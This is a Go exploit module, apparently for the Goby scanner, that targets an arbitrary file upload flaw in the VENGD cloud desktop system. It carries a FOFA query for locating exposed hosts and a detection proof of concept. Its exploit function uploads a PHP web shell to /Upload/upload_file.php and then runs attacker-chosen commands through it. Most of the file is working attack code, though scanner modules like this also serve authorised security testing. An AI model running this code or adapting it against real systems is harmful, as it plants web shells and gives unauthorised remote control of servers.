package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "VENGD upload-file Arbitrary file upload",
    "Description": "The Next Generation cloud Desktop system (Vengd) is a leading Desktop virtualization product based on NGD(Next Generation Desktop) architecture in China. There is an arbitrary file upload vulnerability, which attackers can use to write files, upload malicious files to the server, and obtain the server permissions.Causes the entire device or server to be controlled.",
    "Impact": "VENGD upload-file Arbitrary file upload",
    "Recommendation": "<p>1、请用户联系对应厂商修复漏洞。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
    "Product": "And-Letter-Next-Generation-Cloud-Desktop-VENGD",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "和信下一代云桌面VENGD upload_file文件任意文件上传",
            "Description": "和信下一代云桌面系统（VENGD），是国内领先的基于NGD(Next Generation Desktop)架构的桌面虚拟化产品，存在任意文件上传漏洞攻击者可利用该漏洞写入文件，上传恶意文件到服务器，获取服务器权限，导致整个设备或服务器被控制。",
            "Impact": "<p>和信下一代云桌面系统（VENGD），是国内领先的基于NGD(Next Generation Desktop)架构的桌面虚拟化产品，存在任意文件上传漏洞攻击者可利用该漏洞写入文件，上传恶意文件到服务器，获取服务器权限，导致整个设备或服务器被控制。<br></p>",
            "Recommendation": "<p>1、请用户联系对应厂商修复漏洞。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "和信下一代云桌面VENGD",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "VENGD upload-file Arbitrary file upload",
            "Description": "The Next Generation cloud Desktop system (Vengd) is a leading Desktop virtualization product based on NGD(Next Generation Desktop) architecture in China. There is an arbitrary file upload vulnerability, which attackers can use to write files, upload malicious files to the server, and obtain the server permissions.Causes the entire device or server to be controlled.",
            "Impact": "VENGD upload-file Arbitrary file upload",
            "Recommendation": "<p>1、请用户联系对应厂商修复漏洞。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Product": "And-Letter-Next-Generation-Cloud-Desktop-VENGD",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "title=\"和信下一代云桌面VENGD\"",
    "GobyQuery": "title=\"和信下一代云桌面VENGD\"",
    "Author": "r4v3zn",
    "Homepage": "https://www.vesystem.com/",
    "DisclosureDate": "2021-04-10",
    "References": [
        "https://forum.butian.net/share/80"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv",
                    "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
                },
                "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: image/avif\n\n<?php echo(\"21232f297a57a5a743894a0e4a801fc3\") ?>\n------WebKitFormBoundaryfcKRltGv--",
                "data_type": "text",
                "follow_redirect": true,
                "method": "POST",
                "uri": "/Upload/upload_file.php?l=abcdada"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_Requst:",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        },
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/Upload/abcdada/1.php"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "21232f297a57a5a743894a0e4a801fc3",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "header": {
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv",
                    "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
                },
                "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: image/avif\n\n<?php echo(\"21232f297a57a5a743894a0e4a801fc3\") ?>\n------WebKitFormBoundaryfcKRltGv--",
                "data_type": "text",
                "follow_redirect": true,
                "method": "POST",
                "uri": "/Upload/upload_file.php?l=abcdada"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "_Requst:",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        },
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/Upload/abcdada/1.php"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "21232f297a57a5a743894a0e4a801fc3",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6790"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			randomFilename := goutils.RandomHexString(6)
			randomPwd := goutils.RandomHexString(3)
			webshell := fmt.Sprintf("<?php system($_GET[%s]);", randomPwd)
			vulUri := fmt.Sprintf("/Upload/upload_file.php?l=%s", randomFilename)
			cfg := httpclient.NewPostRequestConfig(vulUri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryULRwuFJuwpBsC7H4")
			cfg.VerifyTls = false
			cfg.Data = "------WebKitFormBoundaryULRwuFJuwpBsC7H4\r\n"
			cfg.Data += fmt.Sprintf("Content-Disposition: form-data; name=\"file\"; filename=\"%s.php\"\r\n", randomFilename)
			cfg.Data += "Content-Type: image/avif\r\n\r\n"
			cfg.Data += webshell + "\r\n"
			cfg.Data += "------WebKitFormBoundaryULRwuFJuwpBsC7H4--"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp.StatusCode == 200 {
				time.Sleep(time.Second * 1)
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/Upload/%s/%s.php?%s=%s", randomFilename, randomFilename, randomPwd, cmd)); err == nil && resp.StatusCode == 200 {
					fmt.Println(expResult.HostInfo.FixedHostInfo + fmt.Sprintf("/Upload/%s/%s.php?%s=%s", randomFilename, randomFilename, randomPwd, cmd))
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
